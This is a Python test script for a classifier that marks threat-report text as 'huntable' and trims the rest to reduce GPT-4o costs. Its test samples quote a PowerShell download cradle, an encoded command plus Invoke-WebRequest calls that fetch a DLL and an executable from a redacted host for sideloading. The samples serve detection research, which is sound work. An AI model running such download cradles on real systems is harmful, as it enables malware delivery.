#!/usr/bin/env python3
"""
Test script for the content filtering system.

This script validates the ML-based content filtering system by testing
it on sample content and measuring cost savings.
"""

import sys
import os
import asyncio
import logging
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from utils.content_filter import ContentFilter
from utils.gpt4o_optimizer import GPT4oContentOptimizer

def setup_logging():
    """Setup logging configuration."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    return logging.getLogger(__name__)

async def test_content_filter():
    """Test the content filtering system."""
    logger = setup_logging()
    
    # Initialize content filter
    logger.info("Initializing content filter...")
    content_filter = ContentFilter()
    
    # Test samples
    test_samples = [
        {
            "name": "Huntable Content",
            "text": """
            Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: 
            Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== 
            Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll
            Command: Invoke-WebRequest -uri http://redacted:redacted/Centre.exe -outfile C:UsersPublicRedactedCentre.exe
            """,
            "expected": True
        },
        {
            "name": "Not Huntable Content",
            "text": """
            Acknowledgement We would like to extend our gratitude to the Sitecore team for their support throughout this investigation. 
            Additionally, we are grateful to Tom Bennett and Nino Isakovic for their assistance with the payload analysis. 
            We also appreciate the valuable input and technical review provided by Richmond Liclican and Tatsuhiko Ito.
            Contact Mandiant If you believe your systems may be compromised or you have related matters to discuss, contact Mandiant for incident response assistance.
            """,
            "expected": False
        },
        {
            "name": "Mixed Content",
            "text": """
            Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: 
            Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== 
            
            Acknowledgement We would like to extend our gratitude to the Sitecore team for their support throughout this investigation.
            
            This Centre.exe executable, likely named after the vulnerability, is a renamed "Wallpaper Engine Launcher" from Kristjan Skutta originally named launcher.exe.
            """,
            "expected": True
        }
    ]
    
    # Test pattern-based classification (fallback)
    logger.info("Testing pattern-based classification...")
    for sample in test_samples:
        is_huntable, confidence = content_filter._pattern_based_classification(sample["text"])
        logger.info(f"{sample['name']}: Huntable={is_huntable}, Confidence={confidence:.3f}")
    
    # Test content filtering
    logger.info("\nTesting content filtering...")
    optimizer = GPT4oContentOptimizer()
    
    for sample in test_samples:
        logger.info(f"\nTesting: {sample['name']}")
        result = await optimizer.optimize_content_for_gpt4o(sample["text"])
        
        logger.info(f"  Success: {result['success']}")
        logger.info(f"  Is Huntable: {result['is_huntable']}")
        logger.info(f"  Confidence: {result['confidence']:.3f}")
        logger.info(f"  Cost Reduction: {result['cost_reduction_percent']:.1f}%")
        logger.info(f"  Tokens Saved: {result['tokens_saved']:,}")
        logger.info(f"  Chunks Removed: {result['chunks_removed']}")
        
        if result['removed_chunks']:
            logger.info("  Removed chunks:")
            for i, chunk in enumerate(result['removed_chunks'][:3]):  # Show first 3
                logger.info(f"    {i+1}. {chunk['text'][:100]}... (confidence: {chunk['confidence']:.3f})")
    
    # Test cost estimation
    logger.info("\nTesting cost estimation...")
    sample_content = test_samples[2]["text"]  # Mixed content
    
    cost_with_filtering = optimizer.get_cost_estimate(sample_content, use_filtering=True)
    cost_without_filtering = optimizer.get_cost_estimate(sample_content, use_filtering=False)
    
    logger.info(f"Cost with filtering: ${cost_with_filtering['total_cost']:.4f}")
    logger.info(f"Cost without filtering: ${cost_without_filtering['total_cost']:.4f}")
    logger.info(f"Savings: ${cost_without_filtering['total_cost'] - cost_with_filtering['total_cost']:.4f}")
    logger.info(f"Savings percentage: {((cost_without_filtering['total_cost'] - cost_with_filtering['total_cost']) / cost_without_filtering['total_cost'] * 100):.1f}%")
    
    # Test optimization stats
    logger.info("\nOptimization statistics:")
    stats = optimizer.get_optimization_stats()
    for key, value in stats.items():
        logger.info(f"  {key}: {value}")
    
    logger.info("\nContent filtering test completed successfully!")

async def test_ml_model():
    """Test ML model training and prediction."""
    logger = setup_logging()
    
    # Check if training data exists
    training_data_path = "highlighted_text_classifications.csv"
    if not Path(training_data_path).exists():
        logger.warning(f"Training data not found: {training_data_path}")
        logger.info("Skipping ML model test")
        return
    
    logger.info("Testing ML model training...")
    content_filter = ContentFilter()
    
    # Train model
    success = content_filter.train_model(training_data_path)
    
    if success:
        logger.info("ML model trained successfully!")
        
        # Test predictions
        test_texts = [
            "powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll",
            "Acknowledgement We would like to extend our gratitude to the Sitecore team for their support",
            "Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll"
        ]
        
        logger.info("Testing ML predictions:")
        for i, text in enumerate(test_texts):
            is_huntable, confidence = content_filter.predict_huntability(text)
            logger.info(f"  Text {i+1}: Huntable={is_huntable}, Confidence={confidence:.3f}")
    else:
        logger.error("ML model training failed!")

async def main():
    """Main test function."""
    logger = setup_logging()
    
    logger.info("Starting content filtering system tests...")
    
    try:
        # Test content filtering
        await test_content_filter()
        
        # Test ML model
        await test_ml_model()
        
        logger.info("All tests completed successfully!")
        return 0
        
    except Exception as e:
        logger.error(f"Test failed: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
